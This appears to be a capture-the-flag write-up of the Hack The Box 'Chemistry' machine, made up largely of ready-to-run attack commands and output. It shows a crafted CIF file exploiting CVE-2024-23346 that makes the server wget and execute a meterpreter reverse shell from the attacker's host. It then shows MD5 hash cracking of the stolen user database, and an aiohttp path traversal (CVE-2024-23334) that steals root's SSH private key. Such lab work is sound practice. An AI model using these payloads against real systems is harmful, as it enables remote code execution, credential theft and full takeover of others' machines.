# Target
| Category       | Details                                                    |
|----------------|------------------------------------------------------------|
| 📝 Name        | [Chemistry](https://app.hackthebox.com/machines/Chemistry) |
| 🏷 Type        | HTB Machine                                                |
| 🖥️ OS          | Linux                                                      |
| 🎯 Difficulty  | Easy                                                       |

# Init
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ echo "$TARGET_IP chemistry.htb" | sudo tee -a /etc/hosts
10.129.48.68 chemistry.htb
```

# Scan
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ nmap -sS -sC chemistry.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 20:05 CET
Nmap scan report for chemistry.htb (10.129.48.68)
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 3.60 seconds
```

# Foothold
Nmap shows two (remote) services running on target machine. SSH and 'something' at port 5000. Let's probe this 2nd service with `curl` to see it this is HTTP server.

```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ curl -I http://chemistry.htb:5000
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.5
Date: Fri, 07 Mar 2025 19:05:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 719
Vary: Cookie
Connection: close
```

We can see that [Werkzeug](https://werkzeug.palletsprojects.com/en/stable/) is running there, thus we are dealing with Python based web application. With little bit of web browsing around http://chemistry.htb:5000 we can see that we can:
* Create new account - http://chemistry.htb:5000/register
* Login using created account  - http://chemistry.htb:5000/login
* Upload `.cif` file - http://chemistry.htb:5000/upload
* View parsed `.cif` structure - http://chemistry.htb:5000/structure/$CIF_ID
* Delete structure - http://chemistry.htb:5000/delete_structure/$CIF_ID

Additional `ffuf` directory discovery does not yield any interesting findings, thus let's go down the `.cif` path and check if we could use it to upload some Python code.

CIF (Crystallographic Information File) format is a standard text file format used for storing and sharing crystallographic information. It is commonly used in structural chemistry, materials science, and crystallography to describe the atomic structure of molecules and crystals. Knowing that we could find what kind of CIF Python parsers libraries are out there and check if they have some vulnerabilities.

With quick Google [search](https://www.google.com/search?q=Python+CIF+parser+vulnerabilities) we can immediately spot [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346). In it's description we can read that one of [pymatgen](https://pymatgen.org/) methods:

> insecurely utilizes `eval()` for processing input, enabling execution of arbitrary code when parsing untrusted input

This sounds quite promissing, we could try to exploit this, of course if Python web application running on target is using this library. Further investigation leads to [interesting article](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346) about this vulnerability with PoC `.cif` file. Let's adapt it to our needs and inject simple `wget` invocation which will make HTTP call to our server, if we will see this call in the logs it will proof that target is vulnerable.

Let's start HTTP server with Python `http.server` module.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

It's ready for inbonud traffic, so we will probe target with following one-liner:
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ curl -X POST -s http://chemistry.htb:5000/register -d "username=user&password=pass" > /dev/null && \
curl -c cookies.txt -X POST -s http://chemistry.htb:5000/login -d "username=user&password=pass" > /dev/null && \
curl -b cookies.txt -X POST -s http://chemistry.htb:5000/upload -F "file=@-;filename=probe.cif" <<EOF > /dev/null && \
CIF_ID=$(curl -b cookies.txt -s http://chemistry.htb:5000/dashboard | grep View | tail -n 1 | grep -oP '(?<=/structure/)[^"]+') > /dev/null && \
curl -b cookies.txt -s http://chemistry.htb:5000/structure/$CIF_ID > /dev/null && \
curl -X POST -b cookies.txt -s http://chemistry.htb:5000/delete_structure/$CIF_ID > /dev/null

data_probe
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("wget http://$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1):8000");0,0,0'
_space_group_magn.name_BNS  "P  n'  m  a'  "

EOF
```

And on our server console we've got:
```
10.129.48.68 - - [07/Mar/2025 20:08:50] "GET / HTTP/1.1" 200 -
```
Which means that injected `wget` has been executed on target and thus it is vulnerable to [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346). We will use this vulnerability to download and execute meterpreter reverse shell. Let's start with running Metasploit `multi/handler` with `linux/x64/meterpreter/reverse_tcp` payload.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload linux/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.14.212:4444
```

It's waiting for connection, so now let's create reverse shell, expose it over HTTP with our Python server and download and execute it using previously described method.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f elf \
    -o shell.cif &&\
curl -c cookies.txt -X POST -s http://chemistry.htb:5000/login -d "username=user&password=pass" > /dev/null && \
curl -b cookies.txt -X POST -s http://chemistry.htb:5000/upload -F "file=@-;filename=shell.cif" <<EOF > /dev/null && \
CIF_ID=$(curl -b cookies.txt -s http://chemistry.htb:5000/dashboard | grep View | tail -n 1 | grep -oP '(?<=/structure/)[^"]+') > /dev/null && \
curl -b cookies.txt -s http://chemistry.htb:5000/structure/$CIF_ID > /dev/null && \
curl -X POST -b cookies.txt -s http://chemistry.htb:5000/delete_structure/$CIF_ID > /dev/null

data_shell
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("wget http://$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1):8000/shell.cif && chmod u+x shell.cif && ./shell.cif");0,0,0'
_space_group_magn.name_BNS  "P  n'  m  a'  "

EOF
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell.cif
```

And we got reverse shell connection!
```
[*] Sending stage (3045380 bytes) to 10.129.48.68
[*] Meterpreter session 1 opened (10.10.14.212:4444 -> 10.129.48.68:35452) at 2025-03-07 20:12:42 +0100

meterpreter > getuid
Server username: app
```

Foothold for user `app` gained, let's proceed to elevation of priviliges.

# Priviliges escalation
Quick scan with exploit suggester does not yield any results. We can also see that there is no user flag in home directory of `app` user, however it could be found at `/home/rosa`.
```
meterpreter > ls /home/rosa
Listing: /home/rosa
===================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2025-03-07 20:02:18 +0100  .bash_history
100644/rw-r--r--  220   fil   2020-02-25 13:03:22 +0100  .bash_logout
100644/rw-r--r--  3771  fil   2020-02-25 13:03:22 +0100  .bashrc
040700/rwx------  4096  dir   2024-06-15 22:38:15 +0200  .cache
040775/rwxrwxr-x  4096  dir   2024-06-16 18:04:57 +0200  .local
100644/rw-r--r--  807   fil   2020-02-25 13:03:22 +0100  .profile
020666/rw-rw-rw-  0     cha   2025-03-07 20:02:18 +0100  .sqlite_history
040700/rwx------  4096  dir   2024-06-15 20:24:18 +0200  .ssh
100644/rw-r--r--  0     fil   2024-06-15 22:43:14 +0200  .sudo_as_admin_successful
100640/rw-r-----  33    fil   2025-03-07 20:03:04 +0100  user.txt
```

Additionally with use `netstat` we could see:
```
meterpreter > netstat

Connection list
===============

    Proto  Local address       Remote address      State        User  Inode  PID/Program name
    -----  -------------       --------------      -----        ----  -----  ----------------
    tcp    127.0.0.1:8080      0.0.0.0:*           LISTEN       0     0
    tcp    127.0.0.53:53       0.0.0.0:*           LISTEN       101   0
    tcp    0.0.0.0:22          0.0.0.0:*           LISTEN       0     0
    tcp    0.0.0.0:5000        0.0.0.0:*           LISTEN       1001  0
    tcp    10.129.48.68:5000   10.10.14.212:41944  ESTABLISHED  1001  0
    tcp    10.129.48.68:35452  10.10.14.212:4444   ESTABLISHED  1001  0
    tcp    10.129.48.68:41972  8.8.8.8:53          SYN_SENT     101   0
    tcp    :::22               :::*                LISTEN       0     0
    udp    127.0.0.53:53       0.0.0.0:*                        101   0
    udp    0.0.0.0:68          0.0.0.0:*                        0     0
    udp    127.0.0.1:36302     127.0.0.53:53       ESTABLISHED  102   0
```

That `root` user is running service on loopback interface on port `8080`, and it would be worth to check it. However we are not able access locally with `curl`.
```
meterpreter > shell
Process 1296 created.
Channel 1 created.
curl -v http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* connect to 127.0.0.1 port 8080 failed: Connection refused
* Failed to connect to 127.0.0.1 port 8080: Connection refused
* Closing connection 0
```

Nor we could access it with meterpreter port forwarding.
```
meterpreter > portfwd add -l 8080 -p 8080 -r 127.0.0.1
[*] Forward TCP relay created: (local) :8080 -> (remote) 127.0.0.1:8080
```
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ curl -v http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.11.1
> Accept: */*
> 
* Request completely sent off
* Recv failure: Connection reset by peer
* closing connection #0
curl: (56) Recv failure: Connection reset by peer
```

Knowing all that let's try to elevate priviliges to `rosa`. Python web application, with use of which we've gained foothold, is supporting authentication, thus it should store credentials somewhere. Let's find this place and check if it contains credentials for `rosa` and if we could use them gain access over SSH.

As application code is available in `/home/app/app.py`, let's analyse it with simple `cat -n app.py`. We can see two interesting things:
- `12:` `app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'` - it's using Sqlite database from `database.db`
- `73:` `if user and user.password == hashlib.md5(password.encode()).hexdigest():` - password are hashed with MD5

`database.db` file could be found in `/home/app/instance` directory.
```
meterpreter > ls /home/app/instance/
Listing: /home/app/instance/
============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100700/rwx------  20480  fil   2025-03-07 20:12:42 +0100  database.db
```

Let's exfiltrate it to dig deeper locally.
```
meterpreter > download /home/app/instance/database.db
[*] Downloading: /home/app/instance/database.db -> /home/magicrc/attack/HTB Chemistry/database.db
[*] Downloaded 20.00 KiB of 20.00 KiB (100.0%): /home/app/instance/database.db -> /home/magicrc/attack/HTB Chemistry/database.db
[*] Completed  : /home/app/instance/database.db -> /home/magicrc/attack/HTB Chemistry/database.db
```

We could see that it (as expected) is `SQLite 3.x` file.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ file database.db
database.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 102, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 102
```

Let's explore it `sqlite3`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ sqlite3 database.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .table
structure  user     
sqlite> SELECT username, password FROM user;
admin|2861debaf8d99436a10ed6f75a252abf
app|197865e46b878d9e74a0346b6d59886a
rosa|63ed86ee9f624c7b14f1d4f43dc251a5
robert|02fcf7cfc10adc37959fb21f06c6b467
jobert|3dec299e06f7ed187bac06bd3b670ab2
carlos|9ad48828b0955513f7cf0f7f6510c8f8
peter|6845c17d298d95aa942127bdad2ceb9b
victoria|c3601ad2286a4293868ec2a4bc606ba3
tania|a4aa55e816205dc0389591c9f82f43bb
eusebio|6cad48078d0241cca9a7b322ecd073b3
gelacia|4af70c80b68267012ecdac9a7e916d18
fabian|4e5d71f53fdd2eabdbabb233113b5dc0
axel|9347f9724ca083b17e39555c36fd9007
kristel|6896ba7b11a62cacffbdaded457c6d92
user|1a1dc91c907325c69271ddf0c944bc72
```

We have found (MD5) hashed credentials, among which we could see `rosa`. Let's use `hashcat` for dictionary attack.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ sqlite3 database.db "SELECT username, password FROM user" | sed 's/|/:/g' > chemistry.hash &&\
hashcat -m 0 -a 0 --username --quiet chemistry.hash /usr/share/wordlists/rockyou.txt > /dev/null;
hashcat -m 0 --username --show chemistry.hash | awk -F: '{print $1 ":" $3}'
rosa:*****************
carlos:carlos123
peter:peterparker
victoria:victoria123
user:pass
```

We were able to recover password for `rosa`, now let's check if was (unwisely) re-used and we can gain access over SSH with it.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ ssh rosa@chemistry.htb
rosa@chemistry.htb's password:
rosa@chemistry:~$
```

It seems so! We've successfully made 1st stage of priviliges escalation, let's grab user flag and proceed to 2nd (root) stage.
```
rosa@chemistry:~$ cat user.txt
********************************
```

As we saw previously there as service `root` service operating on `127.0.0.1:8080`, let's check if we could probe locally with `curl` with `rosa` priviliges.

```
rosa@chemistry:~$ curl -I http://127.0.0.1:8080
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Fri, 07 Mar 2025 19:25:32 GMT
Server: Python/3.9 aiohttp/3.9.1
```

It seems that there is another Python application, this time running with `root` privileges. We can confirm this with simple process lookup.
```
rosa@chemistry:~$ pgrep -aflu 0 "\.py"
1043 /usr/bin/python3.9 /opt/monitoring_site/app.py
``` 

As expected we don't have local access this application
```
rosa@chemistry:~$ cat /opt/monitoring_site/app.py
cat: /opt/monitoring_site/app.py: Permission denied
```

So try to access (and exploit it) over HTTP. We will forward one of ports on our attack machine (as we have more tools) to this remote port on loopback interface.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ ssh -L 7070:localhost:8080 -Nf rosa@chemistry.htb
```

Little bit for web browsing shows that this is some kind of services monitor application (thus the name `monitoring_site/app.py`) with which we could list running services, however functionality of starting and stoping of services is not yet available. With brief JS analysis we could find `http://127.0.0.1:7070/list_services` endopoint which seems to return output of `service --status-all`. Before we continue this path let's [search](https://www.google.com/search?q=aiohttp+vulnerabilities) if there are some `aiohttp/3.9.1` HTTP server vulnarbilities to exploit. After digging thru the results we could find [CVE-2024-23334](https://nvd.nist.gov/vuln/detail/cve-2024-23334) which states:
> When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if reading a file is within the root directory. This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.

Now we need check if `monitoring_site/app.py` is using static files directory. By viewing HTML source we can quickly spot `/assets`, let's check if is vulnerable by traversing in loop to some known file (e.g. `/etc/passwd`).
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ TARGET="http://127.0.0.1:7070/assets"; \
MAX_ATTEMPTS=10

TRAVERSE=""; \
for ((i=0; i<$MAX_ATTEMPTS; i++)); do \
    URL="$TARGET$TRAVERSE/etc/passwd"
    echo "Checking: $URL"
    if curl --path-as-is -s -o /dev/null -w "%{http_code}\n" $URL | grep -Ev "404|403" > /dev/null; then \
        echo "\nTarget vulnerable: \e[31;43mcurl --path-as-is $URL\e[0m"; break; \
    fi; \
    TRAVERSE+="/.."; \
done
Checking: http://127.0.0.1:7070/assets/etc/passwd
Checking: http://127.0.0.1:7070/assets/../etc/passwd
Checking: http://127.0.0.1:7070/assets/../../etc/passwd
Checking: http://127.0.0.1:7070/assets/../../../etc/passwd

Target vulnerable: curl --path-as-is http://127.0.0.1:7070/assets/../../../etc/passwd
```

Our simple probing shows that target is vulnerable and as this service is running as `root` we could access to any file on target machine. So we could go straight to root flag.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ curl --path-as-is http://127.0.0.1:7070/assets/../../../root/root.txt
********************************
```

We have grabbed root flag, but technically we have not escalated privilages to `root`. However with this exploit at hand we could exfiltrate `/etc/shadow` and try to break hashes with `hashcat` or check if `root` user uses private key for SSH authentication.

```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ curl --path-as-is 127.0.0.1:7070/assets/../../../root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

And thre is a key! Let's exfiltrate it and use to gain `root` access over SSH.
```
┌──(magicrc㉿perun)-[~/attack/HTB Chemistry]
└─$ curl --path-as-is -s 127.0.0.1:7070/assets/../../../root/.ssh/id_rsa > chemistry.htb_root_id_rsa && \
chmod 600 chemistry.htb_root_id_rsa && \
ssh root@chemistry.htb -i chemistry.htb_root_id_rsa
root@chemistry:~#
```

With exfiltrated `root` private key we have fully elevated privilages.
